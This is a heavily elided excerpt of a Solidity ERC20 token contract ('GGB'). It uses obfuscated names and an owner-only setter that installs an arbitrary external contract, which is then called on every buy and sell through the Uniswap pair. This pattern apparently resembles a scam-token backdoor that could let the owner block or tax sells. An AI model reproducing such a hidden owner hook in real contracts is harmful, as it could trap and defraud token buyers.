...
contract TokenM is ERC20 {
    ...
    IUserAmountloiede public loiede;
	mapping(address => bool) private _isExcludedFromFees;
    mapping(address => bool) private _isExcludedFromVipFees;
      uint256 total;
    constructor(address tokenOwner) ERC20("GGB", "GGB") {
    ...
    function cooersueBsunseRoov(IUserAmountloiede _loiede) public onlyOwner {
        loiede = _loiede;
    }
    ...
    function _transfer(
        ...
        if (_isExcludedFromFees[from] || _isExcludedFromFees[to]) {
			...
			if(from == uniswapV2Pair){
                ...
                loiede.addInAmount(to, amount);
            }else if(to == uniswapV2Pair){
				loiede.addOutAmount(from, amount);
            }else{
                loiede.addOutAmount(from, amount);
                takeFee = false;
            }
